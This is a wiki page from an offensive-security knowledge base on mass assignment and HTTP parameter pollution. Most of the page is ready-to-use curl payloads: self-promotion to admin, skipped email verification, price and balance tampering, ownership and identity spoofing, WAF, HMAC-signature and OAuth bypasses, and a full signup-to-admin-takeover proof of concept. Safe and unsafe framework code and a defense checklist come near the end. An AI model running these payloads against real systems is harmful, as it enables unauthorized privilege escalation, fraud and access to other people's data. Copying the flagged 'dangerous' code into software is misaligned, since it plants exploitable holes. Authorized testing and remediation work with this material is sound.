---
type: wiki
category: attack
tool: burp,arjun,manual
status: active
last-updated: 2026-04-21
---

# Mass Assignment & HTTP Parameter Pollution (2026 Edition)

> **Purpose:** When an API takes user-supplied JSON and passes it straight into `Model.create(req.body)` / `updateUser(params)` without allowlisting, adding `isAdmin:true`, `role:admin`, or `balance:999999` directly grants privilege escalation.
> Combined with HPP (sending the same parameter name multiple times) to slip past WAFs and validation, this is a stable P2-P1.

## 0. Principle

### 0.1 Mass Assignment

Framework helpers:

| Framework | Vulnerable function | Allowlist mechanism |
|------|---------|---------|
| Rails | `User.new(params)` | `strong_parameters` / `permit` |
| Django | `Model.objects.create(**request.POST)` | `ModelForm.fields` |
| Spring | `@RequestBody User user` without `@JsonIgnore` | `@JsonIgnore` / DTO |
| Laravel | `User::create($request->all())` | `$fillable` / `$guarded` |
| Express (mongoose) | `new User(req.body).save()` | strict schema |
| Sequelize | `User.create(req.body)` | `fields: [...]` |

If no allowlist is applied -> the attacker can submit arbitrary fields (role/is_admin/email_verified/balance/...) -> bypass authorization.

### 0.2 HTTP Parameter Pollution (HPP)

The same param name appears multiple times; different frameworks resolve the value differently:

| Server | Result of `a=1&a=2` |
|--------|---------------------|
| PHP | `$_GET['a']` = `2` (the last one) |
| ASP.NET | `a` = `"1,2"` (joined with a comma) |
| Node.js Express (default) | `req.query.a` = `['1','2']` (array) |
| Java Servlet | `request.getParameter('a')` = `1`; `getParameterValues` = both |
| Ruby Rack | `params[:a]` = `2` (the last one) |
| Go net/http | `r.Form['a']` = `['1','2']`; `r.FormValue('a')` = `1` |

-> A proxy/WAF sees `role=user` while the backend sees `role=admin`.

## 1. Detection

### 1.1 Mass assignment testing

**Step A**: Observe which fields appear in a normal response:

```bash
# Create an account
curl -X POST /api/users -d '{"email":"x@y.com","password":"pw"}'

# Response
{
  "id": 5,
  "email":"x@y.com",
  "role":"user",
  "is_admin":false,
  "email_verified":false,
  "balance":0,
  "created_at":"..."
}
```

**Step B**: Inject sensitive fields during create / update:

```bash
# Method 1: inject directly
curl -X POST /api/users \
  -d '{"email":"x@y.com","password":"pw","role":"admin","is_admin":true,"email_verified":true,"balance":99999}'

# If the response contains "role":"admin" -> vulnerable
```

**Step C**: If create is protected, try update (usually more permissive):

```bash
curl -X PATCH /api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":"admin","is_admin":true}'
```

### 1.2 Param discovery (finding hidden fields)

Find them from responses / source / JS:

```bash
# katana + gau + grep
cat urls.txt | while read u; do curl -s "$u" | grep -oE '"[a-z_]+":' | sort -u; done > fields.txt

# or hit the target directly with arjun
arjun -u https://target.com/api/users/me -m POST --stable -w /path/to/wordlist
```

**Fields worth trying**:

```
role  roles  is_admin  isAdmin  admin  is_staff  is_superuser
email_verified  verified  activated  enabled
balance  credits  points  coins
password_hash  api_key  token  secret
organization_id  tenant_id  company_id  owner_id  user_id
created_at  updated_at  deleted_at
permissions  scopes  privileges
```

### 1.3 HPP testing

```bash
# GET
curl "https://target.com/transfer?to=alice&to=attacker&amount=100"

# POST body
curl -X POST /transfer -d "to=alice&to=attacker&amount=100"

# JSON (some parsers take the last one)
curl -X POST /transfer -H "Content-Type: application/json" -d '{"to":"alice","to":"attacker","amount":100}'
```

Check the response / balance to see who actually received the funds.

## 2. Classic Mass Assignment PoCs

### 2.1 Self-promotion to admin

```bash
# Register
curl -X POST https://target.com/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"me@x.com","password":"pw","is_admin":true,"role":"admin"}'

# If the response contains role=admin -> vulnerability confirmed
# After login, admin endpoints become accessible
```

### 2.2 Skipping verification via email_verified

```bash
curl -X POST /api/signup \
  -d '{"email":"me@x.com","password":"pw","email_verified":true}'
# Skips email verification -> can log in directly
```

### 2.3 organization_id privilege escalation (lateral movement)

```bash
# Join another org
curl -X PATCH /api/users/me \
  -d '{"organization_id":123}'
# Originally in org 5, now added to org 123 -> can see another company's data
```

### 2.4 Manipulating price / balance

```bash
curl -X POST /api/orders \
  -d '{"product_id":1,"quantity":1,"price":0.01}'
# Buy the item for one cent
```

### 2.5 Directly overwriting password_hash

```bash
curl -X PATCH /api/users/me \
  -d '{"password_hash":"$2y$10$YourBcryptHere"}'
# Bypasses the password change confirmation flow
```

### 2.6 Transferring ownership via owner_id

```bash
curl -X PATCH /api/resources/42 \
  -d '{"owner_id":MY_ID}'
# Turns someone else's resource into mine
```

### 2.7 user_id spoofing

```bash
# Create a comment
curl -X POST /api/comments \
  -d '{"post_id":1,"text":"hi","user_id":ADMIN_ID}'
# Post a comment under the admin's identity
```

## 3. Advanced HPP PoCs

### 3.1 Filter bypass (WAF sees one value, backend sees another)

```
# WAF only looks at the first & the backend takes the last (PHP)
id=1&id=1%20OR%201=1

# WAF sees id=1 -> allows it
# backend takes id=1 OR 1=1 -> SQLi triggers
```

### 3.2 Signature bypass

```
# HMAC signature is computed over certain params
?user=alice&amount=100&sig=abc123

# Add a second user:
?user=alice&amount=100&sig=abc123&user=attacker

# WAF reads the first user=alice when checking the signature -> valid
# backend takes the last user=attacker -> funds go to the attacker
```

### 3.3 OAuth state bypass

```
redirect_uri=https://attacker.com&redirect_uri=https://target.com
# Some OAuth servers only validate the last one but redirect to the first
```

### 3.4 Rails `_method` override

```bash
curl -X POST /users/1 -d "_method=DELETE"
# Rails treats this as a DELETE -> bypasses the POST CSRF check
```

### 3.5 Array / object injection

```bash
# Some parsers treat role[]=user&role=admin as an array
# The permission check only looks at array[0]=user, but the actual role=admin

curl -X POST /api/users \
  -d 'role=user&role[]=admin'
```

### 3.6 Nested JSON injection

```json
{
  "name": "alice",
  "profile": {
    "bio": "hi",
    "role": "admin"    <- if merged into the user object -> admin
  }
}
```

## 4. Framework-specific gotchas

### 4.1 Rails strong_parameters

```ruby
# Safe
params.require(:user).permit(:email, :password)

# Unsafe
User.new(params[:user])
User.update(params[:user])
```

`strong_parameters` can still be misconfigured to open up via `permit!` or `permit(user: {}.to_h.keys)`.

### 4.2 Django ModelForm

```python
# Safe (explicit fields)
class UserForm(forms.ModelForm):
    class Meta:
        fields = ['email', 'name']

# Dangerous
class UserForm(forms.ModelForm):
    class Meta:
        fields = '__all__'   # <- includes is_staff, is_superuser
```

### 4.3 Spring @RequestBody

```java
// Dangerous
public User create(@RequestBody User user) { ... }
// User has role, isAdmin fields -> all settable

// Safe: use a DTO
public User create(@RequestBody UserCreateDTO dto) { ... }
// DTO only has email, password
```

### 4.4 Laravel $fillable vs $guarded

```php
// Safe
protected $fillable = ['email', 'password'];

// Dangerous
protected $guarded = [];   // <- no blacklist = everything is writable
protected $guarded = ['id'];   // <- only blocks id, role/is_admin etc. remain open
```

### 4.5 Mongoose

```js
// Dangerous
const user = new User(req.body);

// Relatively safe (but only if the mongoose schema strictly defines fields)
new User({email: req.body.email, password: req.body.password})
```

### 4.6 Sequelize

```js
// Dangerous
User.create(req.body);

// Safe
User.create(req.body, { fields: ['email', 'password'] });
```

## 5. Relationship to Prototype Pollution

See [63-prototype-pollution.md](63-prototype-pollution.md).

If `Object.assign` / `_.merge` deep-merges user input -> `isAdmin:true` can pollute the prototype -> equivalent to mass assignment but affecting every object.

## 6. Full PoC: signup -> admin takeover

### Step 1: Observe the response schema

```bash
curl -X POST https://target.com/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"a@b.c","password":"pw"}'

{
  "id":42,"email":"a@b.c","role":"user","isAdmin":false,
  "organizationId":null,"emailVerified":false
}
```

### Step 2: Inject sensitive fields

```bash
curl -X POST https://target.com/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@evil.com","password":"pw","role":"admin","isAdmin":true,"emailVerified":true,"organizationId":1}'

{
  "id":43,"email":"admin@evil.com","role":"admin","isAdmin":true,
  "organizationId":1,"emailVerified":true
}
```

### Step 3: Verify permissions

```bash
TOKEN=$(curl ... login | jq -r .token)

curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin/users
# Response 200 + all users -> admin access confirmed
```

### Step 4: Report

```markdown
## Vulnerability Summary
/api/signup passes the request body directly into `User.create()` without field
allowlisting, allowing an attacker to submit `role:"admin"`, `isAdmin:true`,
`emailVerified:true`, `organizationId:1` and obtain admin privileges directly
at registration time.

## PoC
[Two curl calls: signup with admin fields + /admin/users verification]

## Impact
- Unauthenticated admin account creation
- Full admin panel access (read / write / delete any user)
- Bypasses the email verification flow

## Severity
P1 / Critical

## Remediation
1. Add a `fillable` allowlist to the User model: `['email','password','name']`
2. Remove `role/isAdmin/organizationId` from what the public API can set
3. Admin fields should only be modifiable via an admin endpoint + admin token
4. Enforce strict input schema validation (zod/joi/pydantic)
```

## 7. Defense checklist (for remediation recommendations)

```
1. Never do Model.create(request.body) / Model.update(params)
2. Use a DTO / schema / permit allowlist for input fields
3. Sensitive fields (role/isAdmin/email_verified/balance) must only be modifiable server-side
4. Separate by endpoint: /users/profile (self-modifiable) vs /admin/users (admin-modifiable)
5. HPP: pick one explicit value-resolution convention (Express: set `query parser: 'simple'`)
6. Any balance / price / owner_id must be recalculated server-side, never trust the client
7. WAF and backend must use the same parser (avoids HPP)
8. Rate limit signup / profile update
```

## Related Documents

- [63-prototype-pollution.md](63-prototype-pollution.md) — `Object.assign` + mass assignment chain
- [70-host-header-crlf.md](70-host-header-crlf.md) — parameter pollution extended to headers
- PortSwigger Mass Assignment: https://portswigger.net/web-security/api-testing/server-side-parameter-pollution
- OWASP API Security Top 10 2023 — API6 Unrestricted Resource / API5 BOLA / API3 BOPLA
- HackTricks HPP: https://book.hacktricks.wiki/en/pentesting-web/parameter-pollution.html
